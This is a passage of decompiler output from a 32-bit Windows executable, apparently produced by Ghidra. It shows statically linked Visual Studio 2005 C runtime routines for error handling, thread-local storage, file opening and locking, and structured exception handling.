       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_00423b3c = &stack0x00000004;
  _DAT_00423a78 = 0x10001;
  _DAT_00423a20 = 0xc0000409;
  _DAT_00423a24 = 1;
  local_32c = DAT_00422044;
  local_328 = DAT_00422048;
  _DAT_00423a2c = unaff_retaddr;
  _DAT_00423b04 = in_GS;
  _DAT_00423b08 = in_FS;
  _DAT_00423b0c = in_ES;
  _DAT_00423b10 = in_DS;
  _DAT_00423b14 = unaff_EDI;
  _DAT_00423b18 = unaff_ESI;
  _DAT_00423b1c = unaff_EBX;
  _DAT_00423b20 = in_EDX;
  _DAT_00423b24 = in_ECX;
  _DAT_00423b28 = in_EAX;
  _DAT_00423b2c = unaff_EBP;
  DAT_00423b30 = unaff_retaddr;
  _DAT_00423b34 = in_CS;
  _DAT_00423b40 = in_SS;
  DAT_00423a70 = IsDebuggerPresent();
  FUN_004139fa();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&DAT_0041c2a8);
  if (DAT_00423a70 == 0) {
    FUN_004139fa();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_0040ce47(undefined4 param_1)

{
  DAT_00423d44 = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2005 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  int iVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  iVar1 = DAT_00422044;
  local_2d4 = 0x10001;
  _memset(&local_32c,0,0x50);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_32c.ExceptionCode = 0xc000000d;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_004139fa();
  }
  uExitCode = 0xc000000d;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(iVar1);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2005 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_00423d44);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040cf61. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_004139fa();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2005 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  int iVar1;
  
  iVar1 = 0;
  do {
    if (param_1 == (&DAT_00422050)[iVar1 * 2]) {
      return (&DAT_00422054)[iVar1 * 2];
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2005 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_004221b8;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2005 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_004221bc;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Library: Visual Studio 2005 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2005 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004221c0 != -1)) {
    iVar3 = DAT_004221c0;
    pcVar2 = (code *)TlsGetValue(DAT_004221c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_0040d03f;
    }
  }
  hModule = GetModuleHandleA(s_KERNEL32_DLL_0041c2c0);
  if (hModule == (HMODULE)0x0) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_EncodePointer_0041c2b0);
LAB_0040d03f:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2005 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2005 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004221c0 != -1)) {
    iVar3 = DAT_004221c0;
    pcVar2 = (code *)TlsGetValue(DAT_004221c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_0040d0ab;
    }
  }
  hModule = GetModuleHandleA(s_KERNEL32_DLL_0041c2c0);
  if (hModule == (HMODULE)0x0) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_DecodePointer_0041c2d0);
LAB_0040d0ab:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2005 Release

void ___set_flsgetvalue(void)

{
  LPVOID pvVar1;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if (pvVar1 == (LPVOID)0x0) {
    pvVar1 = (LPVOID)__decode_pointer(DAT_00423d4c);
    TlsSetValue(DAT_004221c4,pvVar1);
  }
  return;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2005 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_004221c0 != -1) {
    iVar2 = DAT_004221c0;
    pcVar1 = (code *)__decode_pointer(DAT_00423d54);
    (*pcVar1)(iVar2);
    DAT_004221c0 = -1;
  }
  if (DAT_004221c4 != 0xffffffff) {
    TlsFree(DAT_004221c4);
    DAT_004221c4 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2005 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_KERNEL32_DLL_0041c2c0);
  _Ptd->_pxcptacttab = &DAT_00422da0;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_EncodePointer_0041c2b0);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,s_DecodePointer_0041c2d0);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_00422778;
  InterlockedIncrement((LONG *)&DAT_00422778);
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = DAT_00422d80;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0040d1da();
  return;
}



void FUN_0040d1da(void)

{
  FUN_0040e37b(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2005 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  ___set_flsgetvalue();
  uVar4 = DAT_004221c0;
  pcVar1 = (code *)TlsGetValue(DAT_004221c4);
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_004221c0;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_00423d50);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2005 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_0040d38a(void)

{
  FUN_0040e37b(0xd);
  return;
}



void FUN_0040d396(void)

{
  FUN_0040e37b(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2005 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleA(s_KERNEL32_DLL_0041c2c0);
  if (hModule == (HMODULE)0x0) {
    __mtterm();
    return 0;
  }
  DAT_00423d48 = GetProcAddress(hModule,s_FlsAlloc_0041c300);
  DAT_00423d4c = GetProcAddress(hModule,s_FlsGetValue_0041c2f4);
  DAT_00423d50 = GetProcAddress(hModule,s_FlsSetValue_0041c2e8);
  DAT_00423d54 = GetProcAddress(hModule,s_FlsFree_0041c2e0);
  if ((((DAT_00423d48 == (FARPROC)0x0) || (DAT_00423d4c == (FARPROC)0x0)) ||
      (DAT_00423d50 == (FARPROC)0x0)) || (DAT_00423d54 == (FARPROC)0x0)) {
    DAT_00423d4c = TlsGetValue_exref;
    DAT_00423d48 = (FARPROC)&LAB_0040d0bf;
    DAT_00423d50 = TlsSetValue_exref;
    DAT_00423d54 = TlsFree_exref;
  }
  DAT_004221c4 = TlsAlloc();
  if ((DAT_004221c4 != 0xffffffff) && (BVar1 = TlsSetValue(DAT_004221c4,DAT_00423d4c), BVar1 != 0))
  {
    __init_pointers();
    DAT_00423d48 = (FARPROC)__encode_pointer((int)DAT_00423d48);
    DAT_00423d4c = (FARPROC)__encode_pointer((int)DAT_00423d4c);
    DAT_00423d50 = (FARPROC)__encode_pointer((int)DAT_00423d50);
    DAT_00423d54 = (FARPROC)__encode_pointer((int)DAT_00423d54);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0040d27e;
      pcVar3 = (code *)__decode_pointer((int)DAT_00423d48);
      DAT_004221c0 = (*pcVar3)(puVar5);
      if ((DAT_004221c0 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_004221c0;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_00423d50);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
    __mtterm();
  }
  return 0;
}



undefined * FUN_0040d523(void)

{
  return &DAT_004221c8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2005 Release

void __cdecl __lock_file(FILE *_File)

{
  if (((FILE *)((int)&DAT_004221c4 + 3U) < _File) && (_File < (FILE *)0x422429)) {
    __lock(((int)&_File[-0x2110f]._bufsiz >> 5) + 0x10);
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2005 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)((int)&DAT_004221c4 + 3U) < _File) && (_File < (FILE *)0x422429)) {
    FUN_0040e37b(((int)&_File[-0x2110f]._bufsiz >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2005 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    FUN_0040e37b(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2005 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  wchar_t wVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *_Str1;
  wchar_t *pwVar9;
  uint uVar10;
  
  bVar3 = false;
  bVar2 = false;
  bVar4 = false;
  for (pwVar9 = _Mode; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
  }
  wVar5 = *pwVar9;
  if (wVar5 == L'a') {
    _OpenFlag = 0x109;
LAB_0040d70b:
    uVar10 = DAT_00424478 | 2;
  }
  else {
    if (wVar5 != L'r') {
      if (wVar5 != L'w') goto LAB_0040d6d9;
      _OpenFlag = 0x301;
      goto LAB_0040d70b;
    }
    _OpenFlag = 0;
    uVar10 = DAT_00424478 | 1;
  }
  bVar1 = true;
  pwVar9 = pwVar9 + 1;
  wVar5 = *pwVar9;
  if (wVar5 != L'\0') {
    do {
      if (!bVar1) break;
      if ((ushort)wVar5 < 0x54) {
        if (wVar5 == L'S') {
          if (bVar2) goto LAB_0040d838;
          bVar2 = true;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (wVar5 != L' ') {
          if (wVar5 == L'+') {
            if ((_OpenFlag & 2) != 0) goto LAB_0040d838;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            uVar10 = uVar10 & 0xfffffffc | 0x80;
          }
          else if (wVar5 == L',') {
            bVar4 = true;
LAB_0040d838:
            bVar1 = false;
          }
          else if (wVar5 == L'D') {
            if ((_OpenFlag & 0x40) != 0) goto LAB_0040d838;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (wVar5 == L'N') {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (wVar5 != L'R') goto LAB_0040d6d9;
            if (bVar2) goto LAB_0040d838;
            bVar2 = true;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (wVar5 == L'T') {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_0040d838;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (wVar5 == L'b') {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040d838;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (wVar5 == L'c') {
        if (bVar3) goto LAB_0040d838;
        bVar3 = true;
        uVar10 = uVar10 | 0x4000;
      }
      else if (wVar5 == L'n') {
        if (bVar3) goto LAB_0040d838;
        bVar3 = true;
        uVar10 = uVar10 & 0xffffbfff;
      }
      else {
        if (wVar5 != L't') goto LAB_0040d6d9;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040d838;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar9 = pwVar9 + 1;
      wVar5 = *pwVar9;
    } while (wVar5 != L'\0');
    if (bVar4) {
      for (; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
      }
      iVar7 = _wcsncmp(u_ccs__0041c30c,pwVar9,4);
      if (iVar7 != 0) goto LAB_0040d6d9;
      _Str1 = pwVar9 + 4;
      iVar7 = __wcsicmp(_Str1,u_UTF_8_0041c318);
      if (iVar7 == 0) {
        pwVar9 = pwVar9 + 9;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsicmp(_Str1,u_UTF_16LE_0041c324);
        if (iVar7 == 0) {
          pwVar9 = pwVar9 + 0xc;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsicmp(_Str1,u_UNICODE_0041c338);
          if (iVar7 != 0) goto LAB_0040d6d9;
          pwVar9 = pwVar9 + 0xb;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
  }
  if (*pwVar9 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_00423d58 = _DAT_00423d58 + 1;
    _File->_flag = uVar10;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0040d6d9:
  piVar6 = __errno();
  *piVar6 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2005 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  int iVar2;
  void *pvVar3;
  int iVar4;
  FILE *pFVar5;
  FILE *_File;
  
  pFVar5 = (FILE *)0x0;
  __lock(1);
  iVar4 = 0;
  do {
    _File = pFVar5;
    if (DAT_00426940 <= iVar4) {
LAB_0040da1a:
      if (_File != (FILE *)0x0) {
        _File->_cnt = 0;
        _File->_flag = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_0040da47();
      return _File;
    }
    piVar1 = (int *)(DAT_00425920 + iVar4 * 4);
    if (*piVar1 == 0) {
      iVar4 = iVar4 * 4;
      pvVar3 = __malloc_crt(0x38);
      *(void **)(iVar4 + DAT_00425920) = pvVar3;
      if (*(int *)(DAT_00425920 + iVar4) != 0) {
        iVar2 = ___crtInitCritSecAndSpinCount(*(int *)(DAT_00425920 + iVar4) + 0x20,4000);
        if (iVar2 == 0) {
          _free(*(void **)(iVar4 + DAT_00425920));
          *(undefined4 *)(iVar4 + DAT_00425920) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar4 + DAT_00425920) + 0x20));
          _File = *(FILE **)(iVar4 + DAT_00425920);
        }
      }
      goto LAB_0040da1a;
    }
    if ((*(byte *)(*piVar1 + 0xc) & 0x83) == 0) {
      if ((iVar4 - 3U < 0x11) && (iVar2 = __mtinitlocknum(iVar4 + 0x10), iVar2 == 0))
      goto LAB_0040da1a;
      __lock_file2(iVar4,*(void **)(DAT_00425920 + iVar4 * 4));
      _File = *(FILE **)(DAT_00425920 + iVar4 * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_0040da1a;
      __unlock_file2(iVar4,_File);
    }
    iVar4 = iVar4 + 1;
  } while( true );
}



void FUN_0040da47(void)

{
  FUN_0040e37b(1);
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  uint uVar2;
  bool bVar3;
  int iVar4;
  BOOL BVar5;
  undefined4 uVar6;
  uint uVar7;
  int *piVar8;
  undefined4 local_c;
  int *local_8;
  undefined4 local_4;
  
  piVar8 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00422044);
  bVar3 = false;
  local_c = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar8 != -2) {
    ___security_check_cookie_4(piVar8[1] + iVar1 ^ *(uint *)(*piVar8 + iVar1));
  }
  ___security_check_cookie_4(piVar8[3] + iVar1 ^ *(uint *)(piVar8[2] + iVar1));
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    local_8 = param_1;
    local_4 = param_3;
    *(int ***)((int)param_2 + -4) = &local_8;
    uVar7 = *(uint *)((int)param_2 + 0xc);
    if (*(uint *)((int)param_2 + 0xc) == 0xfffffffe) {
      return 1;
    }
    do {
      uVar2 = piVar8[uVar7 * 3 + 4];
      if ((undefined *)piVar8[uVar7 * 3 + 5] != (undefined *)0x0) {
        iVar4 = __EH4_CallFilterFunc_8((undefined *)piVar8[uVar7 * 3 + 5]);
        bVar3 = true;
        if (iVar4 < 0) {
          local_c = 0;
          goto LAB_0040db5b;
        }
        if (0 < iVar4) {
          if (((*param_1 == -0x1f928c9d) && (DAT_00420028 != (code *)0x0)) &&
             (BVar5 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00420028), BVar5 != 0)) {
            (*DAT_00420028)(param_1,1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(uint *)((int)param_2 + 0xc) != uVar7) {
            __EH4_LocalUnwind_16((int)param_2,uVar7,iVar1,&DAT_00422044);
          }
          *(uint *)((int)param_2 + 0xc) = uVar2;
          if (*piVar8 != -2) {
            ___security_check_cookie_4(piVar8[1] + iVar1 ^ *(uint *)(*piVar8 + iVar1));
          }
          ___security_check_cookie_4(piVar8[3] + iVar1 ^ *(uint *)(piVar8[2] + iVar1));
          uVar6 = __EH4_TransferToHandler_8((undefined *)(piVar8 + uVar7 * 3 + 4)[2]);
          return uVar6;
        }
      }
      uVar7 = uVar2;
    } while (uVar2 != 0xfffffffe);
    if (!bVar3) {
      return 1;
    }
  }
  else {
    if (*(int *)((int)param_2 + 0xc) == -2) {
      return 1;
    }
    __EH4_LocalUnwind_16((int)param_2,0xfffffffe,iVar1,&DAT_00422044);
  }
LAB_0040db5b:
  if (*piVar8 != -2) {
    ___security_check_cookie_4(piVar8[1] + iVar1 ^ *(uint *)(*piVar8 + iVar1));
  }
  ___security_check_cookie_4(piVar8[3] + iVar1 ^ *(uint *)(piVar8[2] + iVar1));
  return local_c;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040dcd8;
  pvStack_28 = ExceptionList;
  local_20 = DAT_00422044 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_00414594();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_0040dd1e(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2005 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2005 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x0040dd68. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2005 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40dd7f,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2005 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2005 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
  if (DVar3 == 0xffffffff) {
    uVar4 = GetLastError();
  }
  else {
    uVar4 = 0;
  }
  if (uVar4 == 0) {
    pbVar1 = (byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x28);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  else {
    __dosmaperr(uVar4);
    DVar3 = 0xffffffff;
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2005 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
